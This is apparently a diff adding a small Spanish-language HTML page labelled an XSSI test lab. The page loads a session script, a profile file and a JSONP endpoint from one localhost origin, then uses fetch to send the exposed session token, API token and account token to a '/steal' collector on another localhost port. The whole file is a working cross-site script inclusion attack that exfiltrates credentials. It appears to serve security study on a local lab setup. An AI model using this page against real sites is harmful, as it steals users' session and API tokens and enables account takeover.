@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>💀 Laboratorio XSSI</title>
+</head>
+<body>
+
+<h1>💀 Laboratorio de prueba de XSSI</h1>
+
+<!-- 1️⃣ JS -->
+<script src="http://localhost:3000/js/session.js"></script>
+<script>
+  fetch("http://localhost:8080/steal?token=" + sessionToken);
+</script>
+
+<!-- 2️⃣ JSON-like -->
+<script src="http://localhost:3000/json/profile.js"></script>
+<script>
+  fetch("http://localhost:8080/steal?token=" + api_token);
+</script>
+
+<!-- 3️⃣ JSONP -->
+<script>
+  function steal(data) {
+    fetch("http://localhost:8080/steal?token=" + data.token);
+  }
+</script>
+<script src="http://localhost:3000/jsonp/account.jsonp?callback=steal"></script>
+
+</body>
+</html>
